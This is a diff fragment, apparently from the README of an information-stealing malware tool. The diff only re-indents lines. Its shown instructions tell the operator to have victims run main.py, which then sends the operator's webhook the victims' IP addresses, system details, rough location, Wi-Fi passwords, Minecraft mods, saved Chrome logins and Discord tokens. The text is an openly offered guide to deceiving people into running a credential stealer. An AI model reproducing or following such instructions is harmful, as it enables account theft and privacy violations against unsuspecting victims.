@@ -13,27 +13,27 @@ HOW TO USE:
 
 5: tell them to run main.py, this will run the code and this content will be sent to your webhook:
 
-Operating system
+  Operating system
 
-Public IP
+  Public IP
 
-Computer Name
+  Computer Name
 
-Private IP
+  Private IP
 
-Cores
+  Cores
 
-GPU
+  GPU
 
-general ip location (WONT BE EXACT IT WILL BE GENERAL LOCATION)
+  general ip location (WONT BE EXACT IT WILL BE GENERAL LOCATION)
 
-Wifi passwords
+  Wifi passwords
 
-All mods in minecraft mods folder (all under 8mb)
+  All mods in minecraft mods folder (all under 8mb)
 
-All saved chrome login details
+  All saved chrome login details
 
-All discord tokens
+  All discord tokens
 
 
 
